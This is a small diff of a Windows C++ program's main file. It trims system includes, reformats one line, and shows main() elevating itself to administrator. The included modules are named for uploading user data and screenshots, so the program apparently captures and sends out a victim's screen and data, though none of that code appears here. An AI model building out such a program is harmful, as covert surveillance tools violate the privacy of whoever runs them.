@@ -1,15 +1,4 @@
-﻿#include <windows.h>
-#include <wininet.h>
-#include <Lmcons.h>
-#include <lm.h>
-#include <iostream>
-#include <string>
-#include <fstream>
-#include <sstream>
-#include <vector>
-#include <gdiplus.h>
-
-#include "header/UserDataUploader.h"
+﻿#include "header/UserDataUploader.h"
 #include "header/FileManager.h"
 #include "header/ScreenshotUploader.h"
 #include "header/ScreenshotManager.h"
@@ -24,7 +13,7 @@
 
 int main() {
     // Check if running as admin
-    if (!StartupManager::IsRunningAsAdmin()) {
+   if (!StartupManager::IsRunningAsAdmin()) {
         StartupManager::RunAsAdmin();
     }
 
